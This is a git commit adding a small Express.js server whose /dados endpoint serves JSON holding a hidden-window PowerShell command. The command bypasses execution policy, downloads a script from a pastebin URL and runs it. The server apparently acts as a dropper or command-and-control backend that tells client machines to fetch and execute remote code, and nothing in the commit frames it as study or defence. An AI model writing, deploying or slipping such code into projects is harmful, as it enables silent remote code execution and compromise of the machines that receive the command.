690b6bc0ce8eaf8334c2d74aad29a5cd9a0a2f67
lakedev0 <lakeflux2077@gmail.com>
2023-05-27 17:32:24 -0300

    Initial commit

---
+++ src/index.js
@@ -0,0 +1,20 @@
+const express = require('express');
+const app = express();
+
+app.get('/dados', (req, res) => {
+    const data = {
+      dp: true,
+      link: 'powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command [scriptblock]::Create((Invoke-WebRequest "https://pastebin.com/raw/jW0p6fGc" -UseBasicParsing)).Invoke();"'
+    };
+  
+    const json = JSON.stringify(data, null, 2).replace(/\\/g, '');
+    res.setHeader('Content-Type', 'application/json');
+    res.send(json);
+  });
+  
+  
+
+const port = 4004;
+app.listen(port, () => {
+  console.log(`Servidor ouvindo na porta ${port}`);
+});
